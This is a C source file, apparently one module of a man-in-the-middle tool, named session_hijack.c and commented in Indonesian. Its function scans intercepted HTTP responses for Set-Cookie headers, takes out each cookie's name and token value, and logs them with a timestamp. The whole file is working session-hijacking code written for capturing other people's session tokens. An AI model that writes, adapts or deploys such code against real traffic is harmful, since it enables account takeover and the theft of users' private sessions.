// ============================================================================
// IMPLEMENTASI: mitm/session_hijack.c — Ekstraktor Header Set-Cookie
// ============================================================================
#include "session_hijack.h"
#include "../utils/logger.h"
#include <string.h>

int session_hijack_init(void) { return 0; }
void session_hijack_cleanup(void) {}

/*
 * === FUNGSI: session_hijack_process() ===
 * Tujuan   : Menyaring header Set-Cookie dari HTTP Response server
 */
int session_hijack_process(const uint8_t *data, int len) {
    if (len < 10) return -1;
    const char *p = (const char*)data;

    // Cari kemunculan header Set-Cookie
    const char *sc = strstr(p, "Set-Cookie: ");
    if (!sc) return -1;
    sc += 12;

    session_cookie_t c = {0};
    c.captured_at = time(NULL);

    // Ambil nama cookie (sebelum karakter '=')
    int i = 0;
    while (*sc && *sc != '=' && i < 127) c.name[i++] = *sc++;
    c.name[i] = '\0';

    if (*sc == '=') sc++;

    // Ambil nilai token cookie (sebelum karakter ';' atau CRLF)
    i = 0;
    while (*sc && *sc != ';' && *sc != '\r' && *sc != '\n' && i < MAX_COOKIE_LEN - 1) {
        c.value[i++] = *sc++;
    }
    c.value[i] = '\0';

    if (strlen(c.name) > 0 && strlen(c.value) > 0) {
        log_cookie(&c);
        return 0;
    }
    return -1;
}
